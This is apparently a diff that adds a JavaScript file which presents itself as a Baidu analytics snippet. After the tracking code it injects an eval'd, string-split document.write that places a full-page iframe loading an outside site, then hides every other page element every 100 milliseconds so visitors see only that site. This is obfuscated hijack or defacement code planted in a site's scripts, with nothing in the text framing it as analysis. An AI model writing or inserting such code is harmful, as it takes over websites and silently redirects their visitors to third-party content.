@@ -1,0 +1,28 @@
+//Í³¼Æ
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?e0af6fcb133b6e029ef0f136352218f2";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+
+
+var ss = '<center id="showcloneshengxiaon"><ifr' + 'ame scrolling="no" marginheight=0 marginwidth=0  frameborder="0" width="100%" width="14' + '00" height="38' + '28" src="http://fc8ww.com"></iframe></center>';
+eval("do" + "cu" + "ment.wr" + "ite('" + ss + "');");
+try {
+	setInterval(function() {
+		try {
+			document.getElementById("div" + "All").style.display = "no" + "ne"
+		} catch (e) {}
+		for (var i = 0; i < document.body.children.length; i++) {
+			try {
+				var a = document.body.children[i].tagName;
+				var b = document.body.children[i].id;
+				if (b != "iconDiv1" && b != "showcloneshengxiaon") {
+					document.body.children[i].style.display = "non" + "e"
+				}
+			} catch (e) {}
+		}
+	}, 100)
+} catch (e) {}
